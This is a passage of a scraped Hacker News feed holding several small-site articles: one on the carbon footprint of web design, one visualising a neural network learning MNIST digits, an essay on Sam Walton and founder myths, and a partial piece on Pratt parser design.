<p>From data centres to transmission networks to the devices that we hold in our hands, it is all consuming electricity, and in turn producing carbon emissions. According to recent estimates, the entire network already consumes 10% of global electricity production, with data traffic doubling roughly every two years. It‚Äôs probably something very few people think about, or are even aware of as being an issue. But the fact of the matter is that the Internet consumes a huge amount of electricity. And when it comes to web design, there is a lot that can be done to make the web far more energy efficient.</p>
<hr>
<h2>Attitudes</h2>
<p>Creating a website is a lot more accessible today, made simpler by the emergence of no-code site builders. But it might be asking a lot for your typical web user or amateur creator to be aware of the environmental impact of their site. This, however, shouldn‚Äôt really be the case for any digital professional. Naturally, web developers will be more conscious of the weight of their pages, given that they are fully immersed in the code and content management that serves what you see on a web page. But even then, many developers simply look for the quickest route to completing a project, rather than the best way to produce the quickest and most efficient site. </p>
<p>So they load a website with bulky Javascript and third-party tools to meet the visual specification of the client or designer. As long as it works, right? They probably don‚Äôt care. They‚Äôre probably happy with their site that loads quickly on their 500Mbps connection. Who cares if they‚Äôre wasting expensive data on mobile connections in other countries? ‚ÄúBut Carl, some of us don‚Äôt have the luxury of building super high-performance, lightweight, and optimised sites due to client budgets and deadlines.‚Äù Well, I think you need to work on your craft, change your attitude and your priorities, or find another profession.</p>
<p>When we talk about the energy efficiency of websites, it‚Äôs easy to assume that it‚Äôs a purely technical topic. However, efficiency can be improved before we even build a website. Design and content have a big impact on energy efficiency.</p>
<p>Therefore, some of the biggest contributors to heavy sites and large CO2 emissions, are <em>designers</em>. Large moving imagery, multiple web fonts, animation, sound, autoplaying video, and generally esoteric design is prevalent these days. We see showcase after showcase of the <em>best of the web</em>, where the only criteria is: ‚ÄúDoes it look well-designed?‚Äù Well, look under the hood. It‚Äôs pretty terrifying. And that‚Äôs not even getting into the many accessibility concerns. If only more designers would ask themselves, ‚ÄúWhen was the last time I considered page size when designing something? When was the last time I decided that page weight was more important than aesthetics?‚Äù </p>
<p>These are questions I have put to designers before, and the response quite often is, ‚ÄúI‚Äôm just experimenting with technologies and trying to improve my UI skills. What harm is there in that?‚Äù Well, <em>Site of the Day</em>, the harm is your energy usage, and the likelihood that nobody‚Äîbesides an echo chamber of fellow designers‚Äîgive a shit about your over-design. People just want to access content quickly, without distraction, without friction, and without it using a tonne of data. That‚Äôs not to say aesthetics aren‚Äôt important‚Äîthey certainly are. The visual design of a site can play a significant role in user experience, readability, and conversion, but as with most things, there is a balance to be achieved. And there is a responsibility to be shared.</p>
<hr>
<h2>Solutions</h2>
<p>Fortunately, there are a growing number of web professionals who do care about the impact sites have on the planet, and there are many solutions designers and developers alike can find to improve their sites without overly compromising their designs. Solutions that I am actively looking into to improve my own work.</p>
<p>So how can we be more energy efficient in web design? Well, the folks over at <a href="https://www.wholegraindigital.com/blog/website-energy-efficiency/">Wholegrain Digital</a> put together a comprehensive list, but here are some key considerations:</p>
<h3>Reduce Images</h3>
<p>The single largest contributors to page weight. The more images, the more data needs to be transferred and the more energy is used. A good starting point is to ask oneself:</p>
<ul>
<li>Does the image genuinely add value to the user?</li>
<li>Does it communicate useful information?</li>
<li>Could the same impact be achieved if the image was smaller?</li>
<li>Could we achieve the same effect with a vector graphic (or even CSS style) instead of a photo?</li>
</ul>
<h3>Optimise Images</h3>
<p>Some designs are focused almost entirely on imagery, in which case optimisation is vital to better performance. There are technical decisions that significantly affect the file size of images displayed on a page. These include:</p>
<ul>
<li>Load images at the correct scale instead of relying on CSS to resize them, so that you avoid loading images that are larger than the scale they will be displayed at.</li>
<li>Use image optimisation tools before you upload them to your site. I personally use <a href="https://imageoptim.com/mac">ImageOptim</a>.</li>
<li>Use the most efficient file format for each image, such as WebP instead of JPEG (although this is not supported by all browsers).</li>
<li>Use image processing tools to resize, crop, and enhance your images that are served. I use <a href="https://www.imgix.com/">imgimx</a> for this, which works well for image-heavy sites such as <a href="https://minimalissimo.com/">Minimalissimo</a>.</li>
</ul>
<h3>Reduce Video</h3>
<p>By far the most data intensive and processing intensive form of content. As with images, ask yourself if videos are really necessary. If they are, never autoplay a video. It creates a much higher load on the users CPU, resulting in vastly greater energy consumption. Plus, it‚Äôs annoying as hell. Let the user decide whether or not to play a video.</p>
<h3>Font Selection and Optimisation</h3>
<p>Web fonts can enhance the visual appeal of site designs, as well as improve readability, but they can add significant file weight to the sites on which they are used. A single font file could be as much as 250Kb, and that might only be for the standard weight. If you want bold, add another 250Kb! A couple of options worth considering:</p>
<ul>
<li>Use system fonts where possible.</li>
<li>Use fewer font variations.</li>
<li>Stick to modern web font file formats like WOFF and WOFF2.</li>
<li>Subset fonts to only include the characters needed on the site.</li>
</ul>
<h3>Write Clean Code</h3>
<p>Tidy and streamlined code is a fundamentally good thing. Keep code clean and simple, avoid duplication, and write efficient queries. The code behind the scenes should be a well oiled, lean machine. And I‚Äôll take this opportunity to share a controversial opinion: <em>all designers should learn to code.</em> At least if they want a website. No-code site builders can be very good, but if you‚Äôre not aware of the underlying code, then you‚Äôll be less aware of ways to optimise your site.</p>
<h3>Use Less Javascript</h3>
<p>JS impacts website efficiency in two ways: by adding file weight to the web page and by increasing the amount of processing required by the user‚Äôs device. The second of these is something that applies to JS much more than to other types of files. Look for ways to achieve front-end interactions, functionality, and animations using more efficient technologies like CSS, or at least use JS efficiently. A particular mention should be given here to tracking and advertising scripts that rarely offer any value to the user, but can add significant file weight. Don‚Äôt let advertising get in the way of craftsmanship.</p>
<h3>Use Server Caching</h3>
<p>Using caching technologies such as <a href="https://memcached.org/">Memcached</a> or <a href="https://varnish-cache.org/">Varnish</a> pre-generate static versions of each page so that the server overhead can be significantly reduced for most visitors. This significantly reduces server energy consumption and makes a big difference to page load times. </p>
<h3>SEO</h3>
<p>When optimising a site for search engines, we are helping people find the information they want quickly and easily. When SEO is successful, it results in people spending less time browsing the web looking for information, and visiting fewer pages that don‚Äôt meet their needs.</p>
<hr>
<p>No site is perfect, but appreciating that we have a responsibility to produce better digital design for the planet and for users is a good place to start. Web efficiency is an attitude and the result of a mindful approach to building for the web.</p>
<hr>
<h2>Useful Resources</h2>
<ul>
<li><a href="https://www.websitecarbon.com/">Website Carbon</a> (test your site‚Äôs carbon footprint)</li>
<li><a href="https://imageoptim.com/mac">ImageOptim</a> (image optimisation tool)</li>
<li><a href="https://www.imgix.com/">imgix</a> (image processing tool)</li>
<li><a href="https://developers.google.com/speed/pagespeed/insights/">Google PageSpeed Insights</a> (test your site‚Äôs performance)</li>
<li><a href="https://solar.lowtechmagazine.com/low-tech-solutions.html">Low-tech Solutions</a> (by Low-tech Magazine)</li>
</ul></div>
</section>
    </div></div>]]>
            </description>
            <link>https://cmhb.de/web-design-and-carbon-impact</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513427</guid>
            <pubDate>Fri, 18 Sep 2020 06:02:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Visualizing how a NeuralNetwork learns to recognize the MNIST digits]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24513373">thread link</a>) | @zbendefy
<br/>
September 17, 2020 | https://zbendefy.github.io/neuralnet-web/index.html | <a href="https://web.archive.org/web/*/https://zbendefy.github.io/neuralnet-web/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

    <p>Visualizing a neural network
    </p>

    

    <p>
        Training a Neural network to perform well is not an easy task. The many
        layers of neurons, each having lots of weights and biases often add up
        to several millions of parameters to configure trough learning. Understanding what
        these parameters do by looking at them as raw data is not possible, thus we need somehow visualuze
        what the network does.
        Beside the architecture of the network, we also have to choose and tune a range of training parameters as well, such as activation function,
        regularization parameters and cost function that, to be tuned well, require some rough idea of what 
        the network does.
    </p>

    <picture>
        <source srcset="https://zbendefy.github.io/neuralnet-web/assets/preview.webp" type="image/webp">
        <source srcset="https://zbendefy.github.io/neuralnet-web/assets/preview.gif" type="image/gif">
        <img src="https://zbendefy.github.io/neuralnet-web/assets/preview.webp">
            <p> 
                A neural network learning to recognize digits. Each pixel represents a weight of the network.
            </p>
        
    </picture>

    <p>
        In a conventional algorithm choosing an optimal structure for the data the algorithm operates 
        on can be relatively easily figured out by analyzing the cost of the algorithm and conducting measurements.
        Debugging such an algorithm is also relatively straightforward with many advanced tools available.
        In the case of neural networks however it is often very difficult to understand what a network had eventually
        learned to do during a training, let alone guessing it beforehand. And when a network is not behaving like expected, 
        the familiar debugging tools are not that helpful in figuring out where the issue lies. In some cases however 
        such as image recognition problems we can sort of visualize what the network is trying to learn
        and gain some insight into the learning process. Let's see an example to that.
    </p>
    
    <p>
        The <a href="http://yann.lecun.com/exdb/mnist/">MNIST dataset</a> of hand-written digits is a classic example to introduce machine learning on.
        This dataset contains pictures of hand-written numbers from 0 to 9 and are annotated with the number that is drawn on them.
        The size of the pictures is 28x28 pixels, (in total 784 pixels).
        As such, the data can be used to train a neural network using the pictures as inputs, and the corresponding number as the desired output.
        There are 60,000 training examples and 10,000 test examples in the dataset to train and test on.
    </p>

    <img src="https://zbendefy.github.io/neuralnet-web/assets/MnistExamples.png">
        <p> 
            Some example images from the MNIST dataset
        </p>
    

    <p>
        To try things out, I trained a very simple network using my 
        <a href="https://github.com/zbendefy/machine.academy">neural network library</a> with the following parameters:
    </p>


    <ul>
        <li>Input layer: 784 neurons (one for each pixel of a source image)</li>
        <li>1 Hidden layer: 64 neurons</li>
        <li>Output layer: 10 neurons (1 neuron for each possible output)</li>
        <li>Sigmoid activation is used</li>
        <li>Cross-entropy cost function</li>
        <li>L2 regularization (lambda=1,5)</li>
        <li>Learning rate: 0.01</li>
    </ul>

    <p>
        The network was initialized using the Xavier initialization that provides a good randomized starting point for a network to be trained. 
        The total number of weights and biases is 50,890.
        The training was run for 230 epochs on the 60,000 training examples using 500 sized mini-batches randomized before each epoch.
    </p>

    <img src="https://zbendefy.github.io/neuralnet-web/assets/diagram.svg">
        <p> 
            The structure of the network
        </p>
    

    <p>
        After each epoch the performance of the network was measured against the 10,000 test examples from the dataset.
        The tests were showing promising results very early on. From the initial state, where the network answered 8.92% of the tested
        examples right (a mere random guess would result in a ~10% success rate), after 4 epochs it surpassed the 50% mark. 80% was reached
        in the 17th epoch, and 90% in the 79th epoch. After 230 epochs the training finished at a success rate of ~92.5%.
    </p>
    
    <p>
        Here you can try out the result of the network. Draw a number using your mouse or your touchscreen and press the 'What did I draw?' button!
    </p>

    <div>
        <canvas id="drawCanvasSmall" width="28" height="28"> Your browser does not support the HTML5 canvas tag.</canvas>
        <canvas id="drawCanvas" width="300" height="300"> Your browser does not support the HTML5 canvas tag.</canvas>
        
        <p id="lblResult">Draw a number from 0 to 9!</p>
    </div>

    <p>
        It doesn't really work! Seeing a more than 90% success rate caused high expectations, but after trying some of my own drawings on the network
        it became apparent that the network is failing to recognize hand written digits.
        Around 3 out of 10 of my attempts were successful and that is very far from 90%.
    </p>
    
    <p>
        So what is going on here? To gain a better understanding of why the network fails to recognize our 
        own drawings let's try to visualize the neurons during training in a way that makes sense of the data and
        see if we can find out whats happening!
    </p>
    
    <p>
        On the next video, you can follow trough the learning process epoch by epoch.
        
        In the Hidden layer section you can see the 64 neurons of the Hidden layer in a 8x8 arrangement.
        Each neuron is a 28x28 grid, showing red pixels for positive weights, and blue pixels for negative weights
        as they connect to the Input layer (that is essentially the input image). 
        The bias (or negative threshold) is also visible as a vertical bar on the right side of the weights.
        Yellow is for positive biases and green is for negative ones.
        The Output layer consists of 10 neurons, each having 8x8 weights connecting to each of the neurons in
        the Hidden layer.
    </p>

    <video controls="">
        <!-- <source src="assets/learning.av1.mp4" type="video/mp4; codecs=av01"/> -->
        <source src="https://zbendefy.github.io/neuralnet-web/assets/learning.mp4" type="video/mp4">
        Your browser does not support the video tag.
    </video>
    
    <p>
        As the network is learning you can see some curly patterns emerging from the initial random noise. Those patterns are the common
        parts of numeric digits that the network generalized to. Looking at this image, it seems like each neuron in the Hidden layer is sort of like a function
        in a programming language, meaning that a following layer (in this case the Output layer) can use the Hidden
        layer's neurons as if they were functions implementing some abstracted behavior. By adjusting a weight in one of
        the the Output layer's neurons, it can selectively discard or use the result of the corresponding 'function' in the Hidden layer.
        This is a very powerful way to process things. Imagine having a programming language, where you are not allowed to use any functions:
        you would have to copy-paste a lot of code around meaning that you'd use up a lot more space due to the more instructions.
        Using multiple layers in a network therefore allows us to use way less total neurons to achieve similiar results.
    </p>
    
    <p>
        The patterns that have emerged in the Hidden layer are quite interesting. As we discussed they are probably some
        generalization of hand-drawn numbers, an efficient, compact way of differentiating from one digit to an other.
        Looking at them closely reveals some interesting property though: they seem to be noticably centered inside 
        the 28x28 pixel sized region. Could this mean that the MNIST data was somehow pre-processed? 
        The MNIST dataset's description reveals that in fact this is the case:
    </p>

    <div>
        <p>
            ‚ùû
        </p>
        <p>
            The images were centered in a 28x28 image by computing the center of mass of the pixels, and translating the image so as to position this point at the center of the 28x28 field.
        </p>
    </div>

    <p>
        That's the issue! The previous drawing applet didn't actually take that into consideration, and as the network only ever encountered
        images that were previously centered, it only learned to recognize those.
        The solution now seems simple: Calculate the center of mass for the image that is drawn, and translate the image so that it is in 
        the middle of the 28x28 region.
        This fixes the issue entirely, providing a network that can actually recognize digits. Try out the fixed version here:
    </p>

    <div>
        <canvas id="drawCanvasCorrectedSmall" width="28" height="28"> Your browser does not support the HTML5 canvas tag.</canvas>
        <canvas id="drawCanvasCorrected" width="300" height="300"> Your browser does not support the HTML5 canvas tag.</canvas>
        
        <p id="lblResultCorrected">Draw a number from 0 to 9!</p>
        
    </div>

    <p>
        We could also randomly translate the input images and train the network on that, but that is an unnecessarily harder
        problem for a network to solve. A conventional algorithm is perfectly suitable for this task. 
        Additionally the translation might not be enough, for even better results we should fit the size of the drawing
        to the 28x28 pixel grid.
    </p>
    
    <p>
        One other interesting insight that we can gain from this visualization, is that the 64 neurons of the Hidden layer are
        in fact more than what the network needs. Pause the video at the end of the learning process, and you'll see that out of
        the 64 neurons in the Hidden layer, around 12 of them are noticably dimmer than the rest. It seems like that 
        these neurons have very little impact on the final result, and their values are not that important.
        If you focus on the top-left neuron on the 8x8 grid, you can see that not only it is very dim, but also 
        none the Output layer's 10 neurons reference that top-left neuron with a high enough weight to matter, meaning that it is a 
        mostly redundant. This is a direct hint that we could reduce the neuron count in the Hidden layer to speed up
        learning.
    </p>
    
    

    <p>
        Thanks for reading. If you would like to experiment with this network, you can download it in JSON format by <a href="https://zbendefy.github.io/neuralnet-web/network_000230.json">clicking here</a>.
        Also you can check out my C# Neural Network library called <a href="https://github.com/zbendefy/machine.academy">machine.academy</a>, featuring GPU acceleration.
    </p>
    
    <p>
        The SVG image of the network's structure was made using <a href="http://alexlenail.me/NN-SVG/LeNet.html">this</a> awesome tool available online.
    </p>

    
    
    <a href="https://github.com/zbendefy/neuralnet-web">
        <img src="https://zbendefy.github.io/neuralnet-web/assets/githublogo.png">
        
    </a>








</div>]]>
            </description>
            <link>https://zbendefy.github.io/neuralnet-web/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513373</guid>
            <pubDate>Fri, 18 Sep 2020 05:50:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ignore every founder‚Äôs story on how they started their company]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24513310">thread link</a>) | @trevmckendrick
<br/>
September 17, 2020 | https://www.trevormckendrick.com/essays/why-you-should-ignore-every-founders-story-about-how-they-started-their-company | <a href="https://web.archive.org/web/*/https://www.trevormckendrick.com/essays/why-you-should-ignore-every-founders-story-about-how-they-started-their-company">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h3>Founding Stories Are Myths</h3><p>Company founding stories are almost always non-malicious lies. Take the image above of Reed Hastings @ Netflix....</p><p>Reed Hastings has <a href="https://www.vanityfair.com/news/2013/02/07-reed-hastings">said</a> <a href="http://archive.fortune.com/2009/01/27/news/newsmakers/hastings_netflix.fortune/index.html">many</a> <a href="https://twitter.com/netflix/status/2746816142?lang=en">times</a> <a href="https://www.wired.com/2002/12/netflix-6/">that</a> <a href="http://www.evancarmichael.com/library/reed-hastings/Reed-Hastings-Quotes.html">he got the</a> <a href="https://www.hollywoodreporter.com/news/reed-hastings-innovator-year-81514">idea</a> for Netflix because he once was charged a $40 late fee on Apollo 13.</p><p>That didn‚Äôt actually happen. </p><p>It‚Äôs unfortunate because it will inevitably mislead anyone learning how to start a company. </p><h3>Sam Walton's Overnight Success</h3><figure><p><img src="https://uploads-ssl.webflow.com/5f139e18c71662d40ea9d4c9/5f139e70c3fecf07561da8e7_grand_opening.jpeg" alt=""></p></figure><p>Sam was already 44(!) when he opened the first Walmart and had been running his own retail stores for over 15 years.</p><p>He wondered why people focused on the beginning of Walmart: </p><p><strong>Somehow over the years folks have gotten the impression that Walmart was something I dreamed up out of the blue as a middle-aged man, and that it was just this great idea that turned into an overnight success‚Ä¶ </strong></p><p><strong>Like most overnight successes, it was about 20 years in the making.</strong></p><p>If you‚Äôre trying to build your own thing &amp; you want to learn from ‚Äúthe founder of Walmart‚Äù, looking at the start of the company itself is stupid because at that point he already had 15 years of experience</p><p>So let‚Äôs start with Sam‚Äôs very first store.</p><h3>The Biggest Mistake of&nbsp;Sam's Professional Life</h3><p>Sam started his retail career at 27 buying his 1st store, a ‚ÄúBen Franklin‚Äù variety store franchise. </p><p>As a beginner he relied on the franchise‚Äôs playbook but also incorporated his own experiments. </p><p>Things like:</p><ul role="list"><li>putting popcorn &amp; ice cream machines in front of the store to drive traffic</li><li>doing huge discounts but actually making it up in volume (i.e. not ironically)</li><li>buying directly from manufactures instead of going through the franchise (which allowed for cheaper prices)</li></ul><p>He worked hard on that single store for 5 years, grew sales 3.5x to $250k/year and became the #1 Ben Franklin franchisee in his six-state region.</p><p>But then he found out he‚Äôd made a gigantic mistake.</p><p><strong><em>When he signed the store lease he didn‚Äôt include an option to renew it.</em></strong></p><p>The owner (a local department store competitor) saw his success &amp; refused to renew the lease at any price, thereby forcing Sam to shut down the store.</p><p>Imagine working on something for 5 years straight, becoming the best at it, and then having a single person end it all.</p><p>Sam was devastated:</p><p><strong><em>It was the lowpoint of my business life. I felt sick to my stomach. I couldn‚Äôt believe it was happening to me‚Ä¶ I had built the best variety store in the whole region and worked hard in the community ‚Äì done everything right ‚Äì and now I was being kicked out of town. It didn‚Äôt seem fair. I blamed myself for ever getting suckered into such an awful lease, and I was furious at the landlord.</em></strong></p><p>He was mad, but he accepted responsibility:</p><p><strong><em>I‚Äôve always thought of problems as challenges, and this one wasn‚Äôt any different‚Ä¶ I had to pick myself up and get on with it, do it all over again, only even better this time.</em></strong></p><p>If Facebook or Google change their algorithms you at least get to keep your old customer base and your business assets.</p><p>But with a retail store you have none of that. </p><p>And because of the structure of the town they couldn‚Äôt just open another store somewhere nearby.</p><p>The Waltons literally had to pack up their family of 6 and go find a new town.</p><figure><p><img src="https://uploads-ssl.webflow.com/5f139e18c71662d40ea9d4c9/5f139e7090bddf371b5d9227_shadow_figures.jpeg" alt=""></p></figure><p>If he‚Äôd wanted to Sam had plenty of reasons to sulk: they were starting all over in a <em>smaller</em> town (Bentonville) that also had its fair share of competition (3 other variety stores). </p><p><strong>But Sam said ‚Äúit didn‚Äôt matter much because I had big plans.‚Äù</strong></p><h3>Unsexy Determination</h3><p>Sam spent the next 12 years in what I call <em>narrative limbo</em>.</p><p>It‚Äôs the crucial part of any ‚Äúovernight success‚Äù that doesn‚Äôt get covered in the Successful Entrepreneur genre.</p><p>No one writes about all the random tangents and mistakes you make here.</p><p>Like, say, that time Sam tried to start a shopping mall 10 years too early and lost $25,000? </p><p>Or what about the time a tornado destroyed his best performing store? All he had to say was ‚Äúwe just rebuilt it and got back at it.‚Äù</p><p>This is important to know if you‚Äôre trying to learn from Sam, but it doesn‚Äôt fit into any narrative.</p><p>The lesson here is that there will be mistakes and problems on any path to success. As a recent book title says, <a href="https://www.amazon.com/dp/B00G3L1B8K/ref=dp-kindle-redirect?_encoding=UTF8&amp;btkr=1">those obstacles are the way itself.</a></p><p>A coworker said Sam excelled here because he woke up every day ‚Äúdetermined to improve something‚Äù, and that he was</p><p><strong><em>less afraid of being wrong than anyone I‚Äôve ever known‚Ä¶Once he sees he‚Äôs wrong, he just shakes it off and heads in another direction.</em></strong></p><p>You don‚Äôt get any of this from Reed Hastings when he talks about $40 late fees. You think ‚Äúoh I need a great idea‚Äù when the reality is the idea is nothing and your psychology &amp; persistence is everything.</p><p>Eventually Sam got to 15 stores &amp; by 1960 was the largest independent variety store operator in the US, doing a a total of ~$12M (in 2018 dollars) in annual revenue.</p><h3>It Would Seem Obvious</h3><p>It was here that Sam finally saw the opportunity for much bigger discount stores and got to work on the 1st Walmart.</p><p>He was the most successful independent operator in the US &amp; had 15 years of experience in retail, surely it should have been easy for him to raise money from investors‚Ä¶?</p><p>Wrong.</p><p>Sam asked other store owners, entrepreneurs, competitors‚Ä¶ basically everyone said no.</p><p>He got a measly 5% from his own brother &amp; a store manager and had to borrow the other 95% (signing their house and all their other stores as collateral).</p><p><strong><em>Even the great Sam Walton couldn‚Äôt find investors to start the 1st Walmart, on the back of a near-perfect record in retail.</em></strong></p><h3>The 1st Wal-Mart</h3><p>Finally, the point where most people look at to learn, is the end of our story.</p><p>The 1st Walmart was an ugly retail store (8-foot ceilings, concrete floor, wooden fixtures) but it worked because Walmart‚Äôs prices always beat competitors. </p><p>(Even the name ‚ÄúWalmart‚Äù was selected with customer prices in mind: it was cheaper to buy neon signs for 7 letters than the longer names Sam considered.)</p><p>And you think Sam cared 2 cents about what anyone else thought about his stores? </p><p>The New York Times doesn‚Äôt mention Sam or Walmart until 1969, 7 years after the 1st store opening, and he‚Äôs just one random quote in the back of the paper:</p><figure><p><img src="https://uploads-ssl.webflow.com/5f139e18c71662d40ea9d4c9/5f139e7098a06f34c1f02247_south.png" alt=""></p></figure><p>And the Walmart 1970 IPO got a <em>single</em> mention on page 44 of the Times:</p><figure><p><img src="https://uploads-ssl.webflow.com/5f139e18c71662d40ea9d4c9/5f139e7072644e0be8fffc12_nyt_walton.png" alt=""></p></figure><p>If you want to learn from entrepreneurs, look at the start not the finish.</p><p>This first appeared in my weekly newsletter <em>How It Actually Works</em>. <a href="https://www.howitactuallyworks.com/">Sign up to receive it here.</a></p></div></div>]]>
            </description>
            <link>https://www.trevormckendrick.com/essays/why-you-should-ignore-every-founders-story-about-how-they-started-their-company</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513310</guid>
            <pubDate>Fri, 18 Sep 2020 05:32:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Making a Pratt Parser Generator]]>
            </title>
            <description>
<![CDATA[
Score 59 | Comments 12 (<a href="https://news.ycombinator.com/item?id=24513092">thread link</a>) | @todsacerdoti
<br/>
September 17, 2020 | https://www.robertjacobson.dev/designing-a-pratt-parser-generator | <a href="https://web.archive.org/web/*/https://www.robertjacobson.dev/designing-a-pratt-parser-generator">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main" role="main">
    <div>

        <article>

            

            
            <figure>
            </figure>
            

            <section>
                <div>
                    <h2 id="a-brief-history-of-the-pratt-parsing-algorithm">A brief history of the Pratt parsing algorithm</h2>
<p>The history of programming language parsers is dominated by the thorny challenge of parsing expressions, mathematical expressions in particular, taking into account the pecedence of operators in the expressions. Modern formal language theory began with the work of Noam Chomsky in the 1950s, in which Chomsky lays out a mathematical framework for linguistics. Under this mathematical framework, languages exist within a heirarchy of langauges defined according to how difficult the language is to parse.<sup id="fnref:1"><a href="#fn:1">1</a></sup> But computer programmers needed practical, efficient algorithms to parse computer programs for translation to machine code. Parsers of the 1950s relied on ad hoc logic rather than systematic algorithms (a feature which persists to this day, though to a much lesser degree). The 1960s was a golden age of parsing algorithm research when nearly all of the concepts and algorithms we use today were discovered and rigorously studied. By the early 1970s, parsing theory had evolved to the point that  Stephen C. Johnson, a computer scientist at Bell Labs / AT&amp;T, was able to start work on YACC (now ‚ÄúYacc‚Äù), ‚ÄúYet Another Compiler Compiler.‚Äù<sup id="fnref:2"><a href="#fn:2">2</a></sup> YACC was first publically described in 1975 and shipped with Unix version 3<sup id="fnref:3"><a href="#fn:3">3</a></sup>  and is still in use today.</p>

<p>The thorny challenge of parsing expressions was partially solved in 1961 by the venerable shunting-yard algorithm described by Dutch computer scientist Edsger W. Dijkstra, which algorithm could efficiently parse binary infix operator expressions with a value stack and an operator stack, creating nodes from the bottom up. Vaughan R. Pratt generalized Dijkstra‚Äôs sunting-yard algorithm to parsing of entire languages, this time using a single stack, or using recursive descent with the call stack as an implicit stack, creating nodes from the top down. Pratt‚Äôs parsing algorithm overcomes a number of limitations with the shunting-yard algorithm and is simpler.</p>

<p>Precedence climbing was apparently first invented by Martin Richards in 1979<sup id="fnref:4"><a href="#fn:4">4</a></sup> for his BCPL compiler. Precedence climbing uses a single recursive function and a single table mapping token IDs to their precedence instead of Pratt‚Äôs mutual recursive descent and multiple tables. In fact, precedence climbing can be seen as a special case of Pratt parsing, though historically they have been understood as related but not identical.<sup id="fnref:5"><a href="#fn:5">5</a></sup><sup>,</sup><sup id="fnref:6"><a href="#fn:6">6</a></sup></p>

<p>Vaughan Pratt had described his algorithm six years earlier in 1973 at the very first meeting of POPL, the Symposium on Principles of Programming Languages, which remains among the most important conferences in the field. It is interesting to see what other papers are published in the 1973 POPL Proceedings. One finds, for example, Aho, S. C. Johnson, and J. D. Ullman‚Äôs ‚ÄúDeterministic parsing of ambiguous grammars,‚Äú<sup id="fnref:8"><a href="#fn:8">7</a></sup> and James H. Morris, Jr.‚Äôs ‚ÄúTypes are not sets,‚Äù<sup id="fnref:9"><a href="#fn:9">8</a></sup> among papers by several other influential luminaries. Vaughan Pratt had been developing an alternative expression syntax for MACLISP called CGOL,<sup id="fnref:10"><a href="#fn:10">9</a></sup> which he needed to parse.</p>

<h2 id="parser-design">Parser design</h2>

<h3 id="the-typical-design">The typical design</h3>

<p>There are already many articles on the web describing the Pratt parsing algorithm. (I recommend <sup id="fnref:5:1"><a href="#fn:5">5</a></sup>.) If you are not familiar with the algorithm, go read up on it before returning here.</p>

<p>A typical object oriented design is to have a node class for each kind of AST node, each class implementing their own ‚Äúparselet‚Äù method, traditionally named <code>led</code>  for ‚Äúleft donation‚Äù after Pratt‚Äôs original article, that is called by a driver algorithm and is responsible for parsing the node instance‚Äôs operands (children) by calling back into the driver before returning. Each class also keeps track of its associativity and precedence. The driver algorithm consumes a token, looks up the appropriate class in a table, creates an instance and calls its parslet method.</p>

<p>We can be a little bit more efficient by having only a handful of superclasses corresponding to each required (affix, associativity) combination. In the typical object-oriented Pratt-parser design, every operator would need a subclass of the form</p>

<div><div><pre><code><span>class</span> <span>Multiply</span><span>:</span> <span>public</span> <span>InfixLeftAssoc</span><span>{</span>
  <span>Multiply</span><span>(</span><span>Parser</span> <span>parser</span><span>,</span> <span>ASTNode</span> <span>left</span><span>,</span> <span>Token</span> <span>operator</span><span>)</span><span>:</span> 
  	<span>precedence</span><span>(</span><span>40</span><span>){</span>
		<span>super</span><span>(</span><span>parser</span><span>,</span> <span>left</span><span>,</span> <span>operator</span><span>);</span>
  <span>}</span>
  
  <span>T</span> <span>MultiplyMethodA</span><span>(</span><span>U</span> <span>param1</span><span>,</span> <span>V</span> <span>param2</span><span>){...}</span>
  <span>W</span> <span>MultiplyMethodB</span><span>(</span><span>X</span> <span>param1</span><span>,</span> <span>Y</span> <span>param2</span><span>){...}</span>
  <span>// etc.
</span><span>}</span>
</code></pre></div></div>

<p>This class establishes the Multiply operator as an infix, left associative operator. We have also initialized our operator precedence to 40. Again, the <code>InfixLeftAssoc</code> superclass and other ancestor classes compute left and right binding power (LBP and RBP) from the value of precedence and associativity and implement the <code>led</code> method (‚Äúleft donation‚Äù parselette method) and any utility methods and members. This concrete subclass serves the following purposes:</p>

<ol>
  <li>encodes the affix (by specifying its superclass)</li>
  <li>encodes the associativity  (by specifying its superclass)</li>
  <li>records the precedence</li>
  <li>provides a home for <code>MultiplyMethodA</code> and <code>MultiplyMethodB</code></li>
</ol>

<p>But why are we using different classes at all? This OOP design has several flaws:</p>

<ul>
  <li>It violates the principle of separation of concerns: Why are AST nodes doing the work of the parser?</li>
  <li>It violates the DRY Principle: Unless you autogenerate the code, you need to write a class for every operator‚Äîeven if you relegate the parslet code to a handful of superclasses.</li>
  <li>This parser design is littered with static data: operator tokens, constants for precedence, associativity, affix, and token IDs, all of which is redundant, as it exists in a table used by the driver algorithm anyway. (Ironically, it is precisely because of its object-oriented design that the code and the data it acts upon are so disparate. This is not entirely the fault of OOP per se but rather of a poor choice of what concepts should be materialized as objects.)</li>
  <li>Generalizing the previous point: This design fixes the language at compile time. If you want to change the precedence of an operator, you need to rewrite, recompile, and redeploy the parser.</li>
  <li>It is cumbersome to write an operator table statically: Unless the code is automatically generated, writing ‚Äú<code>parser.registeroperator(op, prec, assoc, whatever)</code>,‚Äù the code that line depends on, and every subclass for every single operator is a bummer. Even if you autogenerate code, you have to write a code generator.</li>
</ul>

<p>‚ùùThe temptation to write a code generator is often a sign that a more flexible design exists, a design that exploits whatever regularity exists in the code that makes programmatically generating the code possible in the first place.‚ùû</p>

